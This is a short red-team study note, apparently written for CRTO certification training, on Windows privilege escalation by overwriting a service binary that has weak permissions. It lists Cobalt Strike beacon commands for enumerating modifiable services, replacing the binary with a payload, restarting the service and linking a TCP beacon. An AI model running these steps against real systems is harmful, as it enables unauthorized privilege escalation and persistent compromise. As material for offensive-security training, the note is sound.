
The weak permissions are on the binary itself, unlike [[Weak Service Permissions]].


## 🖊️ Enumeration

1) Use SharpUp to analyze binaries on the system:

`beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices`

2) Use built in powershell command Get-Acl to get info on a specific binary:

`beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl`

3) In the Access section, check which groups have "Modify" access, if your group does then you overwrite the binary with your payload. Rename your payload as the service.
4) While trying to overwrite the file you may get an error message that the file is being used. Try stopping the service and overwrite the file, the execute. 
5) 
```
beacon> run sc stop VulnService3
beacon> upload C:\Payloads\Service 3.exe
beacon> ls
[*] Listing: C:\Program Files\Vuln Services\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 290kb    fil     03/03/2021 11:38:24   Service 3.exe

beacon> run sc start VulnService3
beacon> connect localhost 4444
[+] established link to child beacon: 10.10.123.102
```

Remember to use [[Raw TCP Listener]] and [[TCP Beacon]] for this privesc method. 


### Properties
---
📆 created   {{10-02-2024}} 13:10
🏷️ tags: #redteam #crto 

---

